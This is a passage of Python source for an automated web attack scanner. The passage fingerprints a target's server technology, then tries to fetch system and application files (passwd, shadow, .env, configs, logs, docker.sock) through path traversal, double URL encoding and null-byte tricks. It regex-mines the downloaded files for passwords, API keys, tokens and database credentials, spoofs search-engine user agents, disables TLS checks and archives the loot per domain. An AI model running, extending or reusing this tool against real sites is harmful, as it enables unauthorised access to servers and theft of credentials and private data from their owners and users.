        # Check for specific technologies
        if 'Apache' in techs.get('Server', []):
            server_types.append('apache')
        if 'Nginx' in techs.get('Server', []):
            server_types.append('nginx')
        if 'Microsoft-IIS' in techs.get('Server', []):
            server_types.append('iis')
        if 'Node.js' in techs.get('Backend', []):
            server_types.append('nodejs')
        if 'PHP' in techs.get('Backend', []):
            server_types.append('php')
        if 'Python' in techs.get('Backend', []):
            server_types.append('python')
        if 'Django' in techs.get('Backend', []):
            server_types.append('django')
        if 'Laravel' in techs.get('Backend', []):
            server_types.append('laravel')
        if '.NET' in techs.get('Backend', []):
            server_types.append('dotnet')
        if 'Ruby on Rails' in techs.get('Backend', []):
            server_types.append('rails')
        if 'Docker' in techs.get('Container', []):
            server_types.append('docker')
        if 'Kubernetes' in techs.get('Container', []):
            server_types.append('kubernetes')
        
        # Default to apache if web server not detected but PHP present
        if not server_types and 'PHP' in techs.get('Backend', []):
            server_types.append('apache')
        
        return server_types[0] if server_types else 'unknown'
    
    def generate_server_file_paths(self):
        """Generate server file paths based on detected technology"""
        paths = []
        
        # Always include common Linux paths
        paths.extend(SERVER_FILE_PATHS['linux_common'])
        
        # Add paths based on detected server type
        if self.server_type == 'apache':
            paths.extend(SERVER_FILE_PATHS['web_server'])
            paths.extend([
                '/etc/apache2/sites-available/default',
                '/etc/apache2/sites-available/default-ssl',
                '/var/log/apache2/error.log',
                '/var/log/apache2/access.log',
                '/usr/local/apache2/logs/error_log',
                '/usr/local/apache2/logs/access_log'
            ])
        
        elif self.server_type == 'nginx':
            paths.extend(SERVER_FILE_PATHS['web_server'])
            paths.extend([
                '/etc/nginx/sites-available/default',
                '/var/log/nginx/error.log',
                '/var/log/nginx/access.log',
                '/usr/local/nginx/logs/error.log',
                '/usr/local/nginx/logs/access.log'
            ])
        
        elif self.server_type == 'iis':
            paths.extend([
                'C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config',
                'C:\\inetpub\\logs\\LogFiles\\',
                'C:\\Windows\\Microsoft.NET\\Framework\\',
                'C:\\Windows\\Microsoft.NET\\Framework64\\'
            ])
        
        elif self.server_type == 'nodejs':
            paths.extend([
                '/var/www/*/package.json',
                '/var/www/*/package-lock.json',
                '/var/www/*/.env',
                '/var/www/*/config/',
                '/home/*/app/package.json',
                '/opt/*/package.json',
                '/usr/local/lib/node_modules/'
            ])
        
        elif self.server_type == 'php':
            paths.extend([
                '/etc/php/*/php.ini',
                '/etc/php/*/fpm/php-fpm.conf',
                '/etc/php/*/fpm/pool.d/www.conf',
                '/var/log/php*.log',
                '/usr/local/etc/php/php.ini'
            ])
        
        elif self.server_type == 'django':
            paths.extend([
                '/var/www/*/manage.py',
                '/var/www/*/settings.py',
                '/var/www/*/urls.py',
                '/var/www/*/wsgi.py',
                '/var/www/*/requirements.txt'
            ])
        
        elif self.server_type == 'laravel':
            paths.extend([
                '/var/www/*/.env',
                '/var/www/*/config/',
                '/var/www/*/storage/logs/',
                '/var/www/*/database/'
            ])
        
        elif self.server_type == 'docker':
            paths.extend([
                '/var/lib/docker/containers/',
                '/etc/docker/daemon.json',
                '/var/run/docker.sock',
                'docker-compose.yml',
                'Dockerfile'
            ])
        
        # Add application-specific paths
        paths.extend(SERVER_FILE_PATHS['applications'])
        
        # Add database paths
        paths.extend(SERVER_FILE_PATHS['database'])
        
        # Add cloud paths
        paths.extend(SERVER_FILE_PATHS['cloud'])
        
        # Add backup paths
        paths.extend(SERVER_FILE_PATHS['backups'])
        
        # Add log paths
        paths.extend(SERVER_FILE_PATHS['logs'])
        
        # Remove duplicates and format
        unique_paths = list(set(paths))
        formatted_paths = []
        
        for path in unique_paths:
            # Handle wildcards by creating multiple paths
            if '*' in path:
                # For simple wildcards, create common variations
                base_path = path.replace('*', '')
                formatted_paths.append(base_path)
                
                # Add common username variations
                common_users = ['admin', 'root', 'ubuntu', 'centos', 'debian', 'www-data', 'nginx', 'apache']
                for user in common_users:
                    formatted_paths.append(path.replace('*', user))
            else:
                formatted_paths.append(path)
        
        return formatted_paths[:200]  # Limit to 200 paths
    
    def create_target_directory(self, domain):
        """Create directory for target domain"""
        safe_domain = re.sub(r'[^\w\-_\.]', '_', domain)
        target_dir = self.base_dir / safe_domain / datetime.now().strftime("%Y%m%d_%H%M%S")
        target_dir.mkdir(exist_ok=True, parents=True)
        return target_dir
    
    async def download_server_file(self, session, base_url, server_path, save_path):
        """Attempt to download a server file via path traversal or direct access"""
        try:
            # Try different encoding techniques
            test_urls = []
            
            # 1. Direct path
            test_urls.append(f"{base_url}/{server_path.lstrip('/')}")
            
            # 2. URL encoded
            test_urls.append(f"{base_url}/{quote(server_path.lstrip('/'))}")
            
            # 3. Double URL encoded
            test_urls.append(f"{base_url}/{quote(quote(server_path.lstrip('/')))}")
            
            # 4. With null byte
            test_urls.append(f"{base_url}/{server_path.lstrip('/')}%00")
            
            # 5. With ../ wrappers
            test_urls.append(f"{base_url}/../../../../{server_path.lstrip('/')}")
            
            for test_url in test_urls:
                try:
                    async with session.get(
                        test_url,
                        headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Accept': '*/*'
                        },
                        timeout=aiohttp.ClientTimeout(total=10),
                        ssl=False
                    ) as response:
                        
                        if response.status == 200:
                            content = await response.read()
                            
                            # Check if content looks like a file (not HTML page)
                            if len(content) > 0 and len(content) < self.max_size_bytes:
                                # Save file
                                with open(save_path, 'wb') as f:
                                    f.write(content)
                                
                                file_hash = hashlib.md5(content).hexdigest()[:8]
                                
                                self.downloaded_files.append({
                                    'url': test_url,
                                    'server_path': server_path,
                                    'local_path': str(save_path),
                                    'size': len(content),
                                    'hash': file_hash,
                                    'method': 'direct'
                                })
                                
                                logger.info(f"Downloaded server file: {server_path} -> {save_path} ({len(content)} bytes)")
                                return True
                
                except Exception as e:
                    continue
            
            return False
            
        except Exception as e:
            logger.error(f"Error downloading server file {server_path}: {str(e)}")
            return False
    
    async def download_server_files_batch(self, session, base_url, server_paths, target_dir):
        """Download multiple server files in batch"""
        downloaded = []
        
        for server_path in server_paths:
            # Create safe filename
            safe_name = re.sub(r'[^\w\-_\.\/]', '_', server_path)
            if safe_name.startswith('/'):
                safe_name = safe_name[1:]
            
            save_path = target_dir / safe_name
            
            # Create directory structure
            save_path.parent.mkdir(exist_ok=True, parents=True)
            
            success = await self.download_server_file(session, base_url, server_path, save_path)
            
            if success:
                downloaded.append({
                    'path': server_path,
                    'local_path': str(save_path),
                    'size': save_path.stat().st_size if save_path.exists() else 0
                })
        
        return downloaded
    
    def analyze_downloaded_server_files(self):
        """Analyze downloaded server files for interesting information"""
        analysis = {
            'config_files': [],
            'credential_files': [],
            'log_files': [],
            'database_files': [],
            'source_code': [],
            'interesting_findings': []
        }
        
        for file_info in self.downloaded_files:
            file_path = Path(file_info['local_path'])
            
            if not file_path.exists():
                continue
            
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read(100000)  # Read first 100KB
                
                filename = file_path.name.lower()
                server_path = file_info.get('server_path', '').lower()
                
                # Categorize files
                if any(ext in filename for ext in ['.conf', '.ini', '.yml', '.yaml', '.xml', '.json']):
                    analysis['config_files'].append({
                        'path': server_path,
                        'filename': filename,
                        'size': file_info['size']
                    })
                    
                    # Look for credentials in config files
                    credential_patterns = [
                        r'password\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                        r'pass\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                        r'pwd\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                        r'api[_-]?key\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                        r'secret\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                        r'token\s*[:=]\s*["\']?([^"\'\s]+)["\']?',
                        r'auth[_-]?key\s*[:=]\s*["\']?([^"\'\s]+)["\']?'
                    ]
                    
                    for pattern in credential_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            if len(match) > 5:  # Filter short strings
                                analysis['interesting_findings'].append({
                                    'file': server_path,
                                    'type': 'Potential Credential',
                                    'value': match[:50] + ('...' if len(match) > 50 else '')
                                })
                
                elif '.log' in filename:
                    analysis['log_files'].append({
                        'path': server_path,
                        'filename': filename,
                        'size': file_info['size']
                    })
                    
                    # Look for errors in logs
                    error_patterns = [r'error', r'failed', r'warning', r'critical', r'fatal']
                    for pattern in error_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            analysis['interesting_findings'].append({
                                'file': server_path,
                                'type': 'Error in Log',
                                'value': f"Contains '{pattern}'"
                            })
                
                elif any(ext in filename for ext in ['.sql', '.db', '.dump']):
                    analysis['database_files'].append({
                        'path': server_path,
                        'filename': filename,
                        'size': file_info['size']
                    })
                
                elif any(ext in filename for ext in ['.php', '.js', '.py', '.rb', '.java', '.go']):
                    analysis['source_code'].append({
                        'path': server_path,
                        'filename': filename,
                        'size': file_info['size']
                    })
                
                # Check for specific interesting files
                if 'passwd' in server_path or 'shadow' in server_path:
                    analysis['credential_files'].append({
                        'path': server_path,
                        'filename': filename,
                        'size': file_info['size'],
                        'content_preview': content[:500]
                    })
                
                if '.env' in filename or 'config' in filename:
                    # Look for database credentials
                    db_patterns = [
                        r'DB_(?:HOST|PORT|NAME|USER|PASSWORD)[=:]\s*["\']?([^"\'\n]+)["\']?',
                        r'database[_-]?(?:host|port|name|user|pass)[=:]\s*["\']?([^"\'\n]+)["\']?',
                        r'(?:mysql|postgresql|mongodb|redis)_(?:host|port|db|user|pass)[=:]\s*["\']?([^"\'\n]+)["\']?'
                    ]
                    
                    for pattern in db_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            analysis['interesting_findings'].append({
                                'file': server_path,
                                'type': 'Database Credential',
                                'value': match
                            })
                
                # Look for IP addresses and domains
                ip_matches = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', content)
                domain_matches = re.findall(r'\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b', content)
                
                if ip_matches:
                    analysis['interesting_findings'].append({
                        'file': server_path,
                        'type': 'IP Addresses Found',
                        'value': ', '.join(set(ip_matches))[:100]
                    })
                
                if domain_matches:
                    analysis['interesting_findings'].append({
                        'file': server_path,
                        'type': 'Domains Found',
                        'value': ', '.join(set(domain_matches))[:100]
                    })
            
            except Exception as e:
                logger.error(f"Error analyzing file {file_path}: {str(e)}")
                continue
        
        return analysis
    
    def create_server_files_report(self, domain, analysis):
        """Create comprehensive report of downloaded server files"""
        report = {
            'domain': domain,
            'server_type': self.server_type,
            'total_files_downloaded': len(self.downloaded_files),
            'total_size': sum(f['size'] for f in self.downloaded_files),
            'config_files_count': len(analysis['config_files']),
            'credential_files_count': len(analysis['credential_files']),
            'log_files_count': len(analysis['log_files']),
            'database_files_count': len(analysis['database_files']),
            'source_code_count': len(analysis['source_code']),
            'interesting_findings_count': len(analysis['interesting_findings']),
            'analysis': analysis,
            'downloaded_files': self.downloaded_files[:50],  # First 50 files
            'download_time': datetime.now().isoformat()
        }
        
        return report

# ==================== ENHANCED FILE DOWNLOADER ====================

class FileDownloader:
    """Advanced file downloader with resume capability"""
    
    def __init__(self, base_dir="downloads", max_size_mb=10, timeout=30):
        self.base_dir = Path(base_dir)
        try:
            self.max_size_bytes = int(float(max_size_mb)) * 1024 * 1024  # FIXED: Ensure integer
        except (ValueError, TypeError):
            self.max_size_bytes = 10 * 1024 * 1024  # Default 10MB
        
        self.timeout = timeout
        self.downloaded_files = []
        self.failed_downloads = []
        
        # Create download directory
        self.base_dir.mkdir(exist_ok=True, parents=True)
    
    def create_target_directory(self, domain):
        """Create directory for target domain"""
        safe_domain = re.sub(r'[^\w\-_\.]', '_', domain)
        target_dir = self.base_dir / safe_domain / datetime.now().strftime("%Y%m%d_%H%M%S")
        target_dir.mkdir(exist_ok=True, parents=True)
        return target_dir
    
    async def download_file(self, session, url, save_path, headers=None):
        """Download file with progress tracking"""
        try:
            # Check if file already exists
            if save_path.exists():
                logger.info(f"File already exists: {save_path}")
                return True
            
            # Prepare headers
            request_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
            
            if headers:
                request_headers.update(headers)
            
            # Make request
            async with session.get(
                url, 
                headers=request_headers,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                ssl=False
            ) as response:
                
                if response.status != 200:
                    logger.error(f"Failed to download {url}: Status {response.status}")
                    return False
                
                # Check content length - FIXED: Handle potential string conversion
                content_length = response.headers.get('Content-Length')
                if content_length:
                    try:
                        file_size = int(content_length)
                        # FIXED: Ensure both are integers
                        if int(file_size) > int(self.max_size_bytes):
                            logger.warning(f"File too large: {url} ({file_size/1024/1024:.2f}MB)")
                            return False
                    except (ValueError, TypeError) as e:
                        logger.warning(f"Invalid content length for {url}: {content_length}, error: {e}")
                        # Continue anyway
                
                # Download file
                total_size = 0
                start_time = time.time()
                
                with open(save_path, 'wb') as f:
                    async for chunk in response.content.iter_chunked(8192):
                        if chunk:
                            f.write(chunk)
                            total_size += len(chunk)
                            
                            # Check size during download - FIXED: Ensure integer comparison
                            if int(total_size) > int(self.max_size_bytes):
                                logger.warning(f"File exceeded size limit during download: {url}")
                                f.close()
                                save_path.unlink(missing_ok=True)
                                return False
                
                download_time = time.time() - start_time
                speed = total_size / download_time / 1024 if download_time > 0 else 0
                
                logger.info(f"Downloaded: {url} -> {save_path} ({total_size/1024:.2f}KB, {speed:.2f}KB/s)")
                
                # Verify file
                if save_path.exists() and save_path.stat().st_size > 0:
                    # Calculate hash
                    file_hash = self.calculate_file_hash(save_path)
                    
                    self.downloaded_files.append({
                        'url': url,
                        'path': str(save_path),
                        'size': total_size,
                        'hash': file_hash,
                        'download_time': download_time
                    })
                    return True
                else:
                    logger.error(f"Downloaded file is empty or missing: {save_path}")
                    return False
                    
        except asyncio.TimeoutError:
            logger.error(f"Timeout downloading {url}")
            return False
        except Exception as e:
            logger.error(f"Error downloading {url}: {str(e)}", exc_info=True)  # Added exc_info
            return False
    
    def calculate_file_hash(self, file_path):
        """Calculate file hash"""
        try:
            hasher = hashlib.sha256()
            with open(file_path, 'rb') as f:
                for chunk in iter(lambda: f.read(4096), b''):
                    hasher.update(chunk)
            return hasher.hexdigest()[:16]
        except:
            return "unknown"
    
    def is_sensitive_file(self, filename):
        """Check if file is sensitive"""
        filename_lower = filename.lower()
        
        for category, patterns in SENSITIVE_FILES_PATTERNS.items():
            for pattern in patterns:
                try:
                    if re.search(pattern, filename_lower):
                        return True, category
                except Exception as e:
                    logger.warning(f"Error checking pattern {pattern} against {filename}: {e}")
        
        # Check extensions
        sensitive_extensions = ['.env', '.config', '.sql', '.bak', '.log', '.key', '.pem']
        for ext in sensitive_extensions:
            if filename_lower.endswith(ext):
                return True, 'extension'
        
        return False, None
    
    def analyze_js_file(self, file_path):
        """Analyze JavaScript file for interesting content"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()[:50000]  # First 50KB
            
            findings = []
            
            # Look for API endpoints
            api_patterns = [
                r'["\'](https?://[^"\']+)["\']',
                r'["\'](/[^"\']+)["\']',
                r'fetch\(["\'`]([^"\']+)["\'`]',
                r'axios\.(?:get|post|put|delete)\(["\'`]([^"\']+)["\'`]',
                r'\.ajax\([^)]*url:\s*["\'`]([^"\']+)["\'`]',
                r'window\.location\.href\s*=\s*["\'`]([^"\']+)["\'`]'
            ]
            
            for pattern in api_patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    if len(match) > 5:  # Filter out short strings
                        findings.append(f"API/URL found: {match}")
            
            # Look for secrets/keys
            secret_patterns = [
                r'(?:api[_-]?key|secret|password|token|auth)[:=]\s*["\'`]([^"\']{10,})["\'`]',
                r'(?:[A-Za-z0-9+/]{40,})',  # Base64-like strings
                r'(?:[A-Fa-f0-9]{32,})',    # Hex strings
            ]
            
            for pattern in secret_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if len(match) > 10:
                        findings.append(f"Possible secret found: {match[:50]}...")
            
            # Look for interesting comments
            comment_patterns = [
                r'//\s*(TODO|FIXME|BUG|HACK|XXX):\s*(.+)',
                r'/\*[^*]*\*+(?:[^/*][^*]*\*+)*/\s*(TODO|FIXME|BUG|HACK|XXX):?\s*(.+)'
            ]
            
            for pattern in comment_patterns:
                matches = re.findall(pattern, content, re.MULTILINE)
                for match in matches:
                    if len(match) > 1:
                        findings.append(f"Comment: {match[1]}")
            
            return findings[:10]  # Return first 10 findings
            
        except Exception as e:
            logger.error(f"Error analyzing JS file {file_path}: {str(e)}")
            return []
    
    def create_summary_report(self, domain):
        """Create summary report of downloaded files"""
        if not self.downloaded_files:
            return {
                'domain': domain,
                'total_files': 0,
                'total_size': 0,
                'sensitive_files': [],
                'js_files': [],
                'analysis_results': []
            }
        
        report = {
            'domain': domain,
            'total_files': len(self.downloaded_files),
            'total_size': sum(f['size'] for f in self.downloaded_files),
            'sensitive_files': [],
            'js_files': [],
            'analysis_results': []
        }
        
        for file_info in self.downloaded_files:
            file_path = Path(file_info['path'])
            filename = file_path.name
            
            # Check if sensitive
            is_sensitive, category = self.is_sensitive_file(filename)
            if is_sensitive:
                report['sensitive_files'].append({
                    'filename': filename,
                    'category': category,
                    'size': file_info['size'],
                    'hash': file_info['hash']
                })
            
            # Analyze JS files
            if filename.endswith('.js'):
                analysis = self.analyze_js_file(file_path)
                report['js_files'].append({
                    'filename': filename,
                    'size': file_info['size'],
                    'analysis': analysis
                })
        
        return report
    
    def create_archive(self, domain):
        """Create archive of downloaded files"""
        try:
            if not self.downloaded_files:
                return None
                
            safe_domain = re.sub(r'[^\w\-_\.]', '_', domain)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            archive_path = self.base_dir / f"{safe_domain}_{timestamp}.zip"
            
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file_info in self.downloaded_files:
                    file_path = Path(file_info['path'])
                    if file_path.exists():
                        arcname = file_path.relative_to(self.base_dir)
                        zipf.write(file_path, arcname)
            
            logger.info(f"Created archive: {archive_path}")
            return str(archive_path)
        except Exception as e:
            logger.error(f"Error creating archive: {str(e)}")
            return None

# ==================== AI ENHANCED HTML PARSER ====================

class SmartHTMLParser(HTMLParser):
    """AI-Enhanced HTML Parser with Context Awareness"""
    
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.links = []
        self.scripts = []
        self.styles = []
        self.forms = []
        self.inputs = []
        self.metadata = []
        self.comments = []
        self.parameters = set()
        self.current_form = {}
        self.in_form = False
        self.js_files = []
        self.api_endpoints = []
        self.sensitive_data = []
        
    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        
        # Extract links
        if tag == 'a' and 'href' in attrs_dict:
            href = attrs_dict['href'].strip()
            if href and not href.startswith(('javascript:', 'mailto:', 'tel:', '#')):
                full_url = urljoin(self.base_url, href)
                if full_url not in self.links:
                    self.links.append(full_url)
                    
                    # Extract parameters
                    if '?' in href:
                        query = href.split('?', 1)[1]
                        params = parse_qs(query)
                        self.parameters.update(params.keys())
        
        # Extract scripts
        elif tag == 'script':
            src = attrs_dict.get('src', '').strip()
            if src:
                full_src = urljoin(self.base_url, src)
                if full_src not in self.scripts:
                    self.scripts.append(full_src)
                    if src.endswith('.js'):
                        self.js_files.append({
                            'url': full_src,
                            'async': 'async' in attrs_dict,
                            'defer': 'defer' in attrs_dict,
                            'type': attrs_dict.get('type', '')
                        })
        
        # Extract stylesheets
        elif tag == 'link':
            rel = attrs_dict.get('rel', '').lower()
            href = attrs_dict.get('href', '').strip()
            if rel in ['stylesheet', 'preload'] and href:
                full_href = urljoin(self.base_url, href)
                if full_href not in self.styles:
                    self.styles.append(full_href)
        
        # Extract forms
        elif tag == 'form':
            self.in_form = True
            self.current_form = {
                'action': attrs_dict.get('action', '').strip(),
                'method': attrs_dict.get('method', 'GET').upper(),
                'inputs': [],
                'enctype': attrs_dict.get('enctype', ''),
                'id': attrs_dict.get('id', ''),
                'class': attrs_dict.get('class', ''),
                'name': attrs_dict.get('name', '')
            }
        
        # Extract form inputs
        elif tag in ['input', 'textarea', 'select', 'button'] and self.in_form:
            input_info = {
                'type': attrs_dict.get('type', 'text'),
                'name': attrs_dict.get('name', ''),
                'value': attrs_dict.get('value', ''),
                'placeholder': attrs_dict.get('placeholder', ''),
                'required': 'required' in attrs_dict,
                'id': attrs_dict.get('id', ''),
                'class': attrs_dict.get('class', '')
            }
            if input_info['name']:
                self.current_form['inputs'].append(input_info)
                self.inputs.append(input_info)
                self.parameters.add(input_info['name'])
        
        # Extract metadata
        elif tag == 'meta':
            meta_info = {}
            for key, value in attrs:
                meta_info[key] = value
            self.metadata.append(meta_info)
        
        # Extract API endpoints from data attributes
        elif tag in ['div', 'span', 'button', 'a']:
            for key, value in attrs:
                if key.startswith('data-') and ('api' in key.lower() or 'url' in key.lower()):
                    if value.startswith('/'):
                        self.api_endpoints.append(urljoin(self.base_url, value))
    
    def handle_endtag(self, tag):
        if tag == 'form' and self.in_form:
            if self.current_form['inputs']:
                self.forms.append(self.current_form)
            self.in_form = False
    
    def handle_comment(self, data):
        clean_data = data.strip()
        if clean_data and len(clean_data) < 500:
            self.comments.append(clean_data)
            
            # Check for sensitive data in comments
            sensitive_keywords = ['password', 'secret', 'key', 'token', 'api', 'admin']
            if any(keyword in clean_data.lower() for keyword in sensitive_keywords):
                self.sensitive_data.append({
                    'type': 'Comment',
                    'data': clean_data[:100]
                })
    
    def handle_data(self, data):
        # Look for API endpoints in JavaScript data
        if data and ('fetch(' in data or 'axios.' in data or 'ajax(' in data):
            urls = re.findall(r'["\'](https?://[^"\']+)["\']', data)
            for url in urls:
                if url.startswith('/'):
                    url = urljoin(self.base_url, url)
                self.api_endpoints.append(url)
    
    def get_analysis(self):
        """Return analyzed data"""
        return {
            'links_found': len(self.links),
            'scripts_found': len(self.scripts),
            'styles_found': len(self.styles),
            'forms_found': len(self.forms),
            'inputs_found': len(self.inputs),
            'parameters_found': len(self.parameters),
            'comments_found': len(self.comments),
            'js_files': self.js_files[:10],
            'api_endpoints': list(set(self.api_endpoints))[:10],
            'sensitive_data': self.sensitive_data,
            'links': self.links[:50],
            'parameters': list(self.parameters)[:20],
            'forms': self.forms[:10]
        }

# ==================== AI-POWERED SCANNER CORE ====================

class AIScanner:
    """Intelligent Scanner with File Download Capabilities"""
    
    def __init__(self, scan_mode='Standard', auto_mode=True, download_files=True, 
                 download_server_files=True, max_file_size=10, save_dir=""):
        self.scan_mode = scan_mode
        self.auto_mode = auto_mode
        self.download_files = download_files
        self.download_server_files = download_server_files
        
        # Convert max_file_size to integer - FIXED
        try:
            self.max_file_size = int(float(max_file_size))
        except (ValueError, TypeError):
            self.max_file_size = 10
        
        # Setup download directory
        if save_dir and Path(save_dir).exists():
            self.save_directory = Path(save_dir)
        else:
            self.save_directory = Path("scanner_downloads")
        
        self.config = AUTO_CONFIGS.get(scan_mode, AUTO_CONFIGS['Standard'])
        
        # Adaptive settings
        self.timeout = self.config['timeout']
        self.max_threads = min(self.config['max_threads'], 3 if IOS_MODE else 15)
        self.max_depth = self.config['max_depth']
        self.target_info = {}
        
        # File downloader
        self.downloader = FileDownloader(
            base_dir=self.save_directory / "web_files",
            max_size_mb=self.max_file_size,
            timeout=self.timeout
        )
        
        # Server file downloader
        self.server_downloader = ServerFileDownloader(
            base_dir=self.save_directory / "server_files",
            max_size_mb=self.max_file_size,
            timeout=self.timeout
        )
        
        # Performance optimization
        self.cache = {}
        self.session = None
        self.user_agent = self.get_random_agent()
        
        # Statistics
        self.scan_stats = {
            'requests_made': 0,
            'errors': 0,
            'start_time': time.time(),
            'vulnerabilities_found': 0,
            'files_downloaded': 0,
            'server_files_downloaded': 0,
            'sensitive_files_found': 0,
            'js_files_downloaded': 0
        }
        
        logger.info(f"AI Scanner Initialized - Mode: {scan_mode}")
        logger.info(f"Auto-Mode: {'Enabled' if auto_mode else 'Disabled'}")
        logger.info(f"File Download: {'Enabled' if download_files else 'Disabled'}")
        logger.info(f"Server File Download: {'Enabled' if download_server_files else 'Disabled'}")
        logger.info(f"Max File Size: {self.max_file_size}MB")
        logger.info(f"Save Directory: {self.save_directory}")
        logger.info(f"iOS Environment: {'Yes' if IOS_MODE else 'No'}")
    
    def get_random_agent(self):
        """Get random user agent"""
        agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'SirraAI-Scanner/9.0 (Security Research)',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
        ]
        return random.choice(agents)
    
    async def create_session(self):
        """Create optimized HTTP session"""
        if not self.session:
            connector = aiohttp.TCPConnector(
                limit=self.max_threads,
                ssl=False,
                force_close=False,
                enable_cleanup_closed=True
            )
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={
                    'User-Agent': self.user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
            )
        return self.session
    
    async def smart_request(self, url, method='GET', **kwargs):
        """Intelligent HTTP request with error handling"""
        session = await self.create_session()
        
        self.scan_stats['requests_made'] += 1
        
        try:
            start_time = time.time()
            
            async with session.request(
                method=method.upper(),
                url=url,
                allow_redirects=True,
                ssl=False,
                **kwargs
            ) as response:
                
                # Read response intelligently
                content = await response.read()
                
                # Try to decode
                try:
                    decoded = content.decode('utf-8', errors='ignore')
                except:
                    decoded = content.decode('latin-1', errors='ignore')
                
                # Calculate metrics
                request_time = time.time() - start_time
                
                return {
                    'success': True,
                    'status': response.status,
                    'headers': dict(response.headers),
                    'content': decoded[:100000],  # Limit content size
                    'raw_content': content[:50000],  # Keep raw for file detection
                    'url': str(response.url),
                    'time': request_time,
                    'size': len(content),
                    'content_type': response.headers.get('Content-Type', ''),
                    'server': response.headers.get('Server', ''),
                    'redirects': len(response.history) if hasattr(response, 'history') else 0
                }
                
        except asyncio.TimeoutError:
            self.scan_stats['errors'] += 1
            return {'success': False, 'error': 'Timeout', 'url': url}
        except aiohttp.ClientError as e:
            self.scan_stats['errors'] += 1
            return {'success': False, 'error': str(e)[:100], 'url': url}
        except Exception as e:
            self.scan_stats['errors'] += 1
            return {'success': False, 'error': str(e)[:100], 'url': url}
    
    async def download_server_config_files(self, domain, base_url, tech_stack):
        """Download server configuration files based on detected technology"""
        if not self.download_server_files:
            logger.info("Server file download is disabled")
            return {}
        
        print(C.info(f"\n🖥️ Starting server file download for: {domain}"))
        
        # Setup server downloader
        self.server_downloader.set_server_technology(tech_stack)
        
        # Generate server file paths based on detected technology
        server_paths = self.server_downloader.generate_server_file_paths()
        
        print(C.info(f"  Generated {len(server_paths)} server file paths"))
        print(C.info(f"  Server type: {self.server_downloader.server_type}"))
        
        # Create target directory
        target_dir = self.server_downloader.create_target_directory(domain)
        
        # Download files in batches
        session = await self.create_session()
        
        downloaded = []
        batch_size = 5 if IOS_MODE else 10
        
        for i in range(0, len(server_paths), batch_size):
            batch = server_paths[i:i + batch_size]
            
            batch_downloaded = await self.server_downloader.download_server_files_batch(
                session, base_url, batch, target_dir
            )
            
            downloaded.extend(batch_downloaded)
            
            # Progress
            progress = min(i + batch_size, len(server_paths))
            percent = (progress / len(server_paths)) * 100
            sys.stdout.write(C.info(f"  Progress: {progress}/{len(server_paths)} ({percent:.1f}%)", end='\r'))
            sys.stdout.flush()
            
            # Small delay
            await asyncio.sleep(0.2)
        
        print()
        
        if downloaded:
            print(C.success(f"  Downloaded {len(downloaded)} server files"))
            
            # Analyze downloaded files
            analysis = self.server_downloader.analyze_downloaded_server_files()
            
            # Create report
            report = self.server_downloader.create_server_files_report(domain, analysis)
            
            # Save report
            report_file = target_dir / "server_files_report.json"
            try:
                with open(report_file, 'w') as f:
                    json.dump(report, f, indent=2)
                print(C.success(f"  Report saved: {report_file}"))
            except Exception as e:
                logger.error(f"Error saving report: {str(e)}")
            
            # Update stats
            self.scan_stats['server_files_downloaded'] += len(downloaded)
            
            return {
                'success': True,
                'total_downloaded': len(downloaded),
                'server_type': self.server_downloader.server_type,
                'analysis': analysis,
                'report_path': str(report_file)
            }
        else:
            print(C.warning("  No server files could be downloaded"))
            return {
                'success': False,
                'total_downloaded': 0,
                'message': 'No server files could be accessed'
            }
    
    async def download_found_files(self, domain, sensitive_files, js_files, other_files=None):
        """Download found sensitive and JS files"""
        if not self.download_files:
            logger.info("File download is disabled")
            return {}
        
        logger.info(f"Starting file download for domain: {domain}")
        
        session = await self.create_session()
        target_dir = self.downloader.create_target_directory(domain)
        
        # Prepare all files to download
        all_files = []
        
        # Add sensitive files
        for file_info in sensitive_files:
            all_files.append({
                'url': file_info['url'],
                'type': 'sensitive',
                'category': file_info.get('category', 'unknown')
            })
        
        # Add JS files
        for js_info in js_files:
            all_files.append({
                'url': js_info['url'],
                'type': 'js',
                'info': js_info
            })
        
        # Add other interesting files
        if other_files:
            for file_url in other_files:
                all_files.append({
                    'url': file_url,
                    'type': 'other'
